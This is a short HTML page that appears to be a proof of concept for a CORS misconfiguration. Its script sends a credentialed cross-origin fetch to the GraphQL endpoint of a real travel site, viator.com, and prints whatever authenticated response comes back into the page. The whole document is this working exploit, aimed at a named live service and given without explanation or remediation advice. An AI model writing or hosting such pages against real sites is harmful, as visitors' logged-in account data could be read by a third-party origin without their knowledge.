<!DOCTYPE html>
<html>
<body>
<h2>CORS Response Output:</h2>
<pre id="output" style="white-space: pre-wrap; border: 1px solid #000; padding: 10px;"></pre>

<script>
fetch("https://www.viator.com//graphql/", {
    credentials: "include"
})
.then(async resp => {
    let text = await resp.text();
    try {
        let json = JSON.parse(text);
        text = JSON.stringify(json, null, 4); // pretty print
    } catch (e) {}
    document.getElementById("output").textContent = text;
});
</script>
</body>
</html>
